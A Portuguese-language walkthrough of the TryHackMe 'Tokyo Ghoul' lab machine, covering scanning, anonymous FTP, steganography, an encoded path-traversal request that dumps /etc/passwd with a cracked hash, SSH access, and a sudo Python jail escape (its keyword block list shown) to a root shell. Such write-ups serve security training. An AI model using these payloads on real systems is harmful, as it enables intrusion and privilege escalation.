---
title: TryHackMe - Tokyo Ghoul
author: osvaldotenorio
date: 2022-11-29 00:00:00 -0300
categories: [Walkthrough, TryHackMe, Médio, Linux, Tokyo Ghoul]
tags: [writeup, walkthrough, tryhackme, thm, tutorial, hacking, pentest, ctf, capture, flag, linux, medium, médio]
mermaid: true
image: https://tryhackme-images.s3.amazonaws.com/room-icons/f8cc5f48d1b4cf162c24c6964dfe0718.jpeg
pin: true
---

Dificuldade | Opinião | 📅 Início | 📅 Concluída
:--:|:--:|:--:|:--:
![](/assets/img/nivel/button_medio.png) | ![](/assets/img/nivel/button_dificil.png) | 29 de Novembro de 2022 | 29 de Novembro de 2022


## Escaneamento

- Comando: `nmap -sSV -A -v -Pn -p- --min-rate=10000 10.10.208.57`

```console
Nmap scan report for 10.10.208.57
Host is up (0.36s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    3 ftp      ftp          4096 Jan 23  2021 need_Help?
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.2.10.14
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fa:9e:38:d3:95:df:55:ea:14:c9:49:d8:0a:61:db:5e (RSA)
|_  256 a2:a2:c8:14:96:c5:20:68:85:e5:41:d0:aa:53:8b:bd (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome To Tokyo goul
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
```

## Enumeração

# FTP (21) - Versão: vsftpd 3.0.3

- Comando: `ftp 10.10.208.57`

```console
Connected to 10.10.208.57.
220 (vsFTPd 3.0.3)
Name (10.10.208.57:mithrandir): ftp
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||46876|)
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Jan 23  2021 need_Help?
226 Directory send OK.
ftp> cd need_Help?
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||43117|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           480 Jan 23  2021 Aogiri_tree.txt
drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2021 Talk_with_me
226 Directory send OK.
ftp> get Aogiri_tree.txt
local: Aogiri_tree.txt remote: Aogiri_tree.txt
229 Entering Extended Passive Mode (|||46281|)
150 Opening BINARY mode data connection for Aogiri_tree.txt (480 bytes).
100% |******************************************|   480        4.19 MiB/s    00:00 ETA
226 Transfer complete.
480 bytes received in 00:00 (0.87 KiB/s)
ftp> cd Talk_with_me
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||49553|)
150 Here comes the directory listing.
-rwxr-xr-x    1 ftp      ftp         17488 Jan 23  2021 need_to_talk
-rw-r--r--    1 ftp      ftp         46674 Jan 23  2021 rize_and_kaneki.jpg
226 Directory send OK.
ftp> get need_to_talk
local: need_to_talk remote: need_to_talk
229 Entering Extended Passive Mode (|||49811|)
150 Opening BINARY mode data connection for need_to_talk (17488 bytes).
  0% |                                          |     0        0.00 KiB/s    --:-- ETAg100% |******************************************| 17488       41.75 KiB/s    00:00 ETA
t226 Transfer complete.
17488 bytes received in 00:01 (16.68 KiB/s)
 ftp> get rze_and_kaneki.jpg
local: rize_and_kaneki.jpg remote: rize_and_kaneki.jpg
229 Entering Extended Passive Mode (|||49657|)
150 Opening BINARY mode data connection for rize_and_kaneki.jpg (46674 bytes).
100% |******************************************| 46674       22.25 KiB/s    00:00 ETA
226 Transfer complete.
46674 bytes received in 00:02 (17.79 KiB/s)
ftp> exit
221 Goodbye.
```

- Ao analisar o binário, verifica-se uma palavra que não aparece no texto de execução

![Untitled](TryHackMe%20-%20Tokyo%20Ghoul%20f3445adefbf44ffda5af426f0caa1101/Untitled.png)

- Extraindo informação

![Untitled](TryHackMe%20-%20Tokyo%20Ghoul%20f3445adefbf44ffda5af426f0caa1101/Untitled%201.png)

- Ao textar extrair informação da imagem com a senha encontrada, encontra-se um texto em morse
- Comando:  `steghide extract -sf rize_and_kaneki.jpg`

![Untitled](TryHackMe%20-%20Tokyo%20Ghoul%20f3445adefbf44ffda5af426f0caa1101/Untitled%202.png)

`5A4446794D324D334D484A3558324E6C626E526C63673D3D`

![Untitled](TryHackMe%20-%20Tokyo%20Ghoul%20f3445adefbf44ffda5af426f0caa1101/Untitled%203.png)

- O Hashcat identificou erroneamente, pois não é um hash. O código está em HEX que após decodificar, verifica-se um base64

![Untitled](TryHackMe%20-%20Tokyo%20Ghoul%20f3445adefbf44ffda5af426f0caa1101/Untitled%204.png)

`d1r3c70ry_center`

![Untitled](TryHackMe%20-%20Tokyo%20Ghoul%20f3445adefbf44ffda5af426f0caa1101/Untitled%205.png)

- Comando: `dirsearch -r -u [http://10.10.208.57/d1r3c70ry_center/](http://10.10.208.57/d1r3c70ry_center/) -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -e txt,php -f`

```bash
	_|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: txt, php | HTTP method: GET | Threads: 30 | Wordlist size: 119996

Output File: /root/.dirsearch/reports/10.10.208.57/-d1r3c70ry_center-_22-11-29_13-11-57.txt

Error Log: /root/.dirsearch/logs/errors-22-11-29_13-11-57.log

Target: http://10.10.208.57/d1r3c70ry_center/

[13:11:58] Starting: 
[13:16:11] 200 -  591B  - /d1r3c70ry_center/claim/     (Added to queue)
[13:16:11] 301 -  329B  - /d1r3c70ry_center/claim  ->  http://10.10.208.57/d1r3c70ry_center/claim/
```

![Untitled](TryHackMe%20-%20Tokyo%20Ghoul%20f3445adefbf44ffda5af426f0caa1101/Untitled%206.png)

- Ao tentar explorar o possível LFI, joguei no intruder do Burp e com os payloads padrões, encontrei um bypass

![Untitled](TryHackMe%20-%20Tokyo%20Ghoul%20f3445adefbf44ffda5af426f0caa1101/Untitled%207.png)

```html
GET /d1r3c70ry_center/claim/index.php?view=%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2Fetc%2Fpasswd HTTP/1.1
Host: 10.10.208.57
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=kq3rait4fvoqd1dcnnsp0jo4v0
Upgrade-Insecure-Requests: 1
```

- Response

```html
HTTP/1.1 200 OK
Date: Tue, 29 Nov 2022 16:51:56 GMT
Server: Apache/2.4.18 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 2232
Connection: close
Content-Type: text/html; charset=UTF-8

<html>
    <head>
	<link href="https://fonts.googleapis.com/css?family=IBM+Plex+Sans" rel="stylesheet"> 
	<link rel="stylesheet" type="text/css" href="style.css">
    </head>
    <body>
	<div class="menu">
	    <a href="index.php">Main Page</a>
	    <a href="index.php?view=flower.gif">NO</a>
	    <a href="index.php?view=flower.gif">YES</a>
	</div>
<p>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
statd:x:110:65534::/var/lib/nfs:/bin/false
sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
vagrant:x:1000:1000:vagrant,,,:/home/vagrant:/bin/bash
vboxadd:x:999:1::/var/run/vboxadd:/bin/false
ftp:x:112:118:ftp daemon,,,:/srv/ftp:/bin/false
kamishiro:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:1001:1001:,,,:/home/kamishiro:/bin/bash
</p>    </body>
</html>
```

- Credenciais encontradas: `kamishiro`:`$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0`:`password123`

![Untitled](TryHackMe%20-%20Tokyo%20Ghoul%20f3445adefbf44ffda5af426f0caa1101/Untitled%208.png)

## Exploração (Acesso Inicial)

- Comando: `pwncat-cs ssh://kamishiro@10.10.208.57`

```console
01:55:24 root@m1thr4d1r tokyoghoul → pwncat-cs ssh://kamishiro@10.10.208.57
/root/.local/pipx/venvs/pwncat-cs/lib/python3.10/site-packages/paramiko/transport.py:178: CryptographyDeprecationWarning: Blowfish has been deprecated
  'class': algorithms.Blowfish,
[13:56:45] Welcome to pwncat 🐈!                                        __main__.py:164
Password: ***********
[13:57:16] 10.10.208.57:22: registered new host w/ db                    manager.py:957
(local) pwncat$                                                                        
(remote) kamishiro@vagrant:/home/kamishiro$ id
uid=1001(kamishiro) gid=1001(kamishiro) groups=1001(kamishiro)
```

## Pós-Exploração (Escaneamento Interno)

- Comando: `sudo -l`

```console
[sudo] password for kamishiro: 
Matching Defaults entries for kamishiro on vagrant.vm:
    env_reset, exempt_group=sudo, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User kamishiro may run the following commands on vagrant.vm:
    (ALL) /usr/bin/python3 /home/kamishiro/jail.py
```

```python
#! /usr/bin/python3
#-*- coding:utf-8 -*-
def main():
    print("Hi! Welcome to my world kaneki")
    print("========================================================================")
    print("What ? You gonna stand like a chicken ? fight me Kaneki")
    text = input('>>> ')
    for keyword in ['eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write']:
        if keyword in text:
            print("Do you think i will let you do this ??????")
            return;
    else:
        exec(text)
        print('No Kaneki you are so dead')
if __name__ == "__main__":
    main()
```

## Escalação de Privilégio

- Pra bypass o filtro foi pesquisado python jail escape
- Comandos:
    
    [Escaping Python Jails](https://anee.me/escaping-python-jails-849c65cf306e)
    
    - `sudo /usr/bin/python3 /home/kamishiro/jail.py`
        ```python
        **__builtins__**.__**dict__**['__**IMPORT__**'.lower()](https://www.notion.so/'OS'.lower()).__**dict__**['SYSTEM'.lower()]('/bin/bash -p')
        ```
![Untitled](TryHackMe%20-%20Tokyo%20Ghoul%20f3445adefbf44ffda5af426f0caa1101/Untitled%209.png)